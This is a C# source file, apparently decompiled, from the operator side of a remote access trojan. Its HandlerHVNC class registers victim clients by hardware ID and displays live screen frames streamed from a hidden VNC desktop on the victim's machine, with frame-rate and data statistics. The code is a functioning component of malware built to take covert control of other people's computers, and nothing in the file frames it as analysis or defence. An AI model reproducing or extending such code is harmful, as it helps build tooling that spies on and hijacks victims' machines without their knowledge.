using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerHVNC
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string text = (string)objects[1];
		if (!(text == "Connect"))
		{
			if (!(text == "Screen"))
			{
				return;
			}
			FormHVNC form2 = (FormHVNC)client.Tag;
			if (form2 == null)
			{
				client.Disconnect();
				return;
			}
			Bitmap bitmap = Methods.ByteArrayToBitmap((byte[])objects[2]);
			form2.FPS++;
			if (form2.sw.ElapsedMilliseconds >= 1000)
			{
				form2.Text = $"HVNC [{client.Hwid}]  Fps[{form2.FPS}] Data[{Methods.BytesToString(((byte[])objects[2]).Length)}] Screen[{form2.screen.Width}x{form2.screen.Height}]";
				form2.FPS = 0;
				form2.sw = Stopwatch.StartNew();
			}
			form2.pictureBox1.Invoke((MethodInvoker)delegate
			{
				form2.pictureBox1.Image = bitmap;
			});
			return;
		}
		FormHVNC form3 = (FormHVNC)Application.OpenForms["HVNC:" + (string)objects[2]];
		if (form3 == null)
		{
			client.Disconnect();
			return;
		}
		form3.Invoke((MethodInvoker)delegate
		{
			form3.client = client;
			form3.screen = new Size((int)objects[3], (int)objects[4]);
			form3.Text = "HVNC [" + (string)objects[2] + "]";
			form3.materialSwitch1.Enabled = true;
		});
		client.Tag = form3;
		client.Hwid = (string)objects[2];
	}
}
